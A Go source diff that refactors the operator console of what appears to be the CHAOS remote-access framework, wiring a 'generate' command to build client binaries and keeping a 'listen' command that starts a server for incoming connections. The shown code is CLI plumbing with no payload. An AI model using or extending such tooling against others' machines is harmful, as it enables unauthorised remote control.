@@ -5,22 +5,27 @@ import (
 	"github.com/c-bata/go-prompt"
 	"github.com/tiagorlampert/CHAOS/internal/handler"
 	"github.com/tiagorlampert/CHAOS/internal/handler/server"
+	"github.com/tiagorlampert/CHAOS/internal/usecase"
 	"github.com/tiagorlampert/CHAOS/internal/util/ui/completer"
-	c "github.com/tiagorlampert/CHAOS/pkg/color"
+	"github.com/tiagorlampert/CHAOS/pkg/color"
 	"github.com/tiagorlampert/CHAOS/pkg/system"
 	"github.com/tiagorlampert/CHAOS/pkg/util"
 	"strings"
 )
 
-type appHandler struct{}
+type appHandler struct {
+	GenerateUseCase usecase.Build
+}
 
-func NewAppHandler() handler.App {
-	return &appHandler{}
+func NewAppHandler(generateUseCase usecase.Build) handler.App {
+	return &appHandler{
+		GenerateUseCase: generateUseCase,
+	}
 }
 
 func (c appHandler) Handle() {
 	p := prompt.New(
-		executor,
+		c.executor,
 		completer.HostCompleter,
 		prompt.OptionPrefix("chaos > "),
 		prompt.OptionPrefixTextColor(prompt.White),
@@ -28,11 +33,14 @@ func (c appHandler) Handle() {
 	p.Run()
 }
 
-func executor(input string) {
+func (c appHandler) executor(input string) {
 	values := strings.Fields(input)
 	for _, v := range values {
 		switch v {
 		case "generate":
+			if err := c.GenerateUseCase.BuildClientBinary(values); err != nil {
+				fmt.Println(color.Red, " [!] Error building client binary!")
+			}
 		case "listen":
 			serverHandler(values)
 			return
@@ -41,7 +49,7 @@ func executor(input string) {
 		case "exit":
 			system.QuitApp()
 		default:
-			fmt.Println(c.Red, " [!] Invalid parameter!")
+			fmt.Println(color.Red, " [!] Invalid parameter!")
 			util.Sleep(3)
 			system.ClearScreen()
 			return
@@ -51,17 +59,16 @@ func executor(input string) {
 
 func serverHandler(v []string) {
 	if !util.Contains(v, "address=") {
-		fmt.Println(c.Yellow, "[!] You should specify a address!")
+		fmt.Println(color.Yellow, "[!] You should specify a address!")
 		return
 	}
 	if !util.Contains(v, "port=") {
-		fmt.Println(c.Yellow, "[!] You should specify a port!")
+		fmt.Println(color.Yellow, "[!] You should specify a port!")
 		return
 	}
 
 	address := util.SplitAfterIndex(util.Find(v, "address="), '=')
 	port := util.SplitAfterIndex(util.Find(v, "port="), '=')
 
-	handler := server.NewServerHandler(address, port)
-	handler.HandleConnections()
+	server.NewServerHandler(address, port).HandleConnections()
 }
